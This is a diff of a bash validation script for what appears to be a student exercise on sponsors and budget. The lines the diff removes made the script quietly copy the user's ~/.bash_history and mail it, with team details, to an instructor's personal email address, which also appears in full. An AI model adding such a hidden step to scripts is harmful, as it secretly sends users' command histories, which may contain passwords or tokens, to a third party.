@@ -3,15 +3,10 @@
 ### Script to validate sponsors
 STEP="STEP 2 : MY SPONSORS"
 
-HISTORY_NAME="history_step2"
-HISTORY="/tmp/$HISTORY_NAME"
-
-EMAIL_PROF=j.marjollet@bh-technologies.com
-
 TEAM_FILE="my_team.txt"
-EMAIL=`cat $TEAM_FILE | grep -i mail | tr --delete ' ' | cut -d '=' -f 2`
-TEAM_NAME=`cat $TEAM_FILE | grep -i name | tr --delete ' ' | cut -d '=' -f 2`
-MOTTO=`cat $TEAM_FILE | grep -i motto | tr --delete ' ' | cut -d '=' -f 2`
+EMAIL=`grep -i mail $TEAM_FILE | cut -d '=' -f 2`
+TEAM_NAME=`grep -i name $TEAM_FILE | cut -d '=' -f 2`
+MOTTO=`grep -i motto $TEAM_FILE | cut -d '=' -f 2`
 
 SPONSORS_FOLDER="My_Sponsors"
 
@@ -33,6 +28,4 @@ then
     fi
 else
     echo -e "\n\e[92mSUCCESS\e[0m : Your total budget is ""$TOTAL_BUDGET"
-    cp ~/.bash_history /tmp/$HISTORY_NAME
-    echo $'Step 2 : OK\n'"User: $EMAIL"$'\n'"Team_Name: $TEAM_NAME"$'\n'"Motto: $MOTTO"$'\n' | mail -s "[$STEP][$TEAM_NAME]" -a $HISTORY $EMAIL_PROF
 fi
